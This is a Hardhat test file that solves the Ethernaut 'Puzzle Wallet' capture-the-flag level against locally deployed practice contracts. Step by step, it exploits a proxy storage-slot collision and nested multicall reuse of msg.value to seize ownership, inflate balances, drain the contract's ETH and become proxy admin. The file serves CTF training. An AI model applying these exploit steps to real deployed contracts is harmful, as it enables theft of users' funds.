// test/ctf/PuzzleWallet.test.js
// Exploit test for Ethernaut Level 24 — Puzzle Wallet

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("CTF: Ethernaut 24 — Puzzle Wallet (proxy storage collision + multicall re-use)", () => {
  let proxy, wallet, attacker, deployer, attackerSigner;
  const INITIAL_BALANCE = ethers.parseEther("0.001");

  beforeEach(async () => {
    [deployer, attackerSigner] = await ethers.getSigners();

    // Deploy PuzzleWallet implementation
    const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
    const walletImpl = await PuzzleWallet.deploy();
    await walletImpl.waitForDeployment();

    // Deploy PuzzleProxy with init data for maxBalance
    const initData = walletImpl.interface.encodeFunctionData("init", [
      ethers.parseEther("0.1"),
    ]);
    const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
    const proxyContract = await PuzzleProxy.deploy(
      deployer.address,
      await walletImpl.getAddress(),
      initData
    );
    await proxyContract.waitForDeployment();

    // Seed the proxy with 0.001 ETH separately (sending ETH in constructor
    // would cause delegatecall to init to fail because init is non-payable
    // and msg.value is preserved in delegatecall context)
    await deployer.sendTransaction({
      to: await proxyContract.getAddress(),
      value: INITIAL_BALANCE,
    });

    proxy  = proxyContract;
    wallet = await ethers.getContractAt("PuzzleWallet", await proxyContract.getAddress());

    // Deploy attacker
    const PuzzleWalletAttacker = await ethers.getContractFactory("PuzzleWalletAttacker");
    attacker = await PuzzleWalletAttacker.connect(attackerSigner).deploy(
      await proxyContract.getAddress()
    );
    await attacker.waitForDeployment();
  });

  it("proxy admin starts as deployer", async () => {
    expect(await proxy.admin()).to.equal(deployer.address);
  });

  it("wallet owner starts as deployer (storage collision slot 0)", async () => {
    // pendingAdmin (slot 0 in proxy) == owner (slot 0 in wallet)
    expect(await wallet.owner()).to.equal(deployer.address);
  });

  it("proxy has 0.001 ETH balance", async () => {
    expect(await ethers.provider.getBalance(await proxy.getAddress())).to.equal(INITIAL_BALANCE);
  });

  it("EXPLOIT step 1: proposeNewAdmin overwrites wallet.owner via slot 0 collision", async () => {
    await proxy.connect(attackerSigner).proposeNewAdmin(attackerSigner.address);
    // pendingAdmin = attackerSigner → wallet.owner = attackerSigner (slot 0 collision)
    expect(await wallet.owner()).to.equal(attackerSigner.address);
  });

  it("EXPLOIT step 2: new owner can whitelist themselves", async () => {
    await proxy.connect(attackerSigner).proposeNewAdmin(attackerSigner.address);
    await wallet.connect(attackerSigner).addToWhitelist(attackerSigner.address);
    expect(await wallet.whitelisted(attackerSigner.address)).to.be.true;
  });

  it("EXPLOIT step 3: nested multicall inflates balances[attacker]", async () => {
    await proxy.connect(attackerSigner).proposeNewAdmin(attackerSigner.address);
    await wallet.connect(attackerSigner).addToWhitelist(attackerSigner.address);

    // Craft nested multicall payload
    const depositSig = wallet.interface.encodeFunctionData("deposit");
    const innerData  = [depositSig];
    const innerMulticall = wallet.interface.encodeFunctionData("multicall", [innerData]);
    const outerData = [depositSig, innerMulticall];

    const sendValue = INITIAL_BALANCE; // match what's in the contract
    await wallet.connect(attackerSigner).multicall(outerData, { value: sendValue });

    // balances[attacker] should now be 2× sendValue
    expect(await wallet.balances(attackerSigner.address)).to.equal(sendValue * 2n);
  });

  it("EXPLOIT full: attacker becomes proxy admin and drains ETH", async () => {
    const proxyAddr = await proxy.getAddress();

    // Run full exploit via attacker contract (needs to match contract ETH balance)
    const contractBal = await ethers.provider.getBalance(proxyAddr);
    await attacker.connect(attackerSigner).attack({ value: contractBal });

    // 1. Proxy drained: attacker contract has the ETH (sent to attackerSigner via execute)
    expect(await ethers.provider.getBalance(proxyAddr)).to.equal(0n);

    // 2. Proxy admin is now msg.sender when attack() was called (attackerSigner)
    //    because setMaxBalance(uint(uint160(msg.sender))) sets slot 1 = proxy.admin
    expect(await proxy.admin()).to.equal(attackerSigner.address);
  });
});
